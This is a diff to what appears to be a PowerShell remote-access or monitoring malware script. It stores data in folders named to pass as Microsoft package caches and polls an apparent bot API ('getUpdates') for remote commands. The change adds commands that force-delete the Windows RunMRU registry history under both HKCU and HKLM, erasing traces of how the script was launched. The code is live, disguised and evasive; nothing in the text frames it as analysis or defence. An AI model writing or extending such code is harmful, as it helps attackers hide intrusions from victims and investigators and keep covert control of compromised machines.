@@ -10,7 +10,7 @@ $global:MonPath = "$env:APPDATA\Packages\Microsoft.WindowsSystem\Cache"
 $global:MonPathJson = "$env:APPDATA\Packages\Microsoft.WindowsTerm\Cache"
 $global:MonPathSnap = "$env:APPDATA\Packages\Microsoft.WindowsSys\Cache\Winsnap"
 
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
+
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
                                                [Net.SecurityProtocolType]::Tls11 -bor `
@@ -2067,6 +2067,9 @@ function Get-ProcessList {
 
 # === CLEAR PESAN LAMA (sekali di awal saja) ===
 try {
+
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 
     $clearResp = Invoke-RestMethod -Uri "$apiBase/getUpdates?timeout=1" -UseBasicParsing
     if ($clearResp.result.Count -gt 0) {
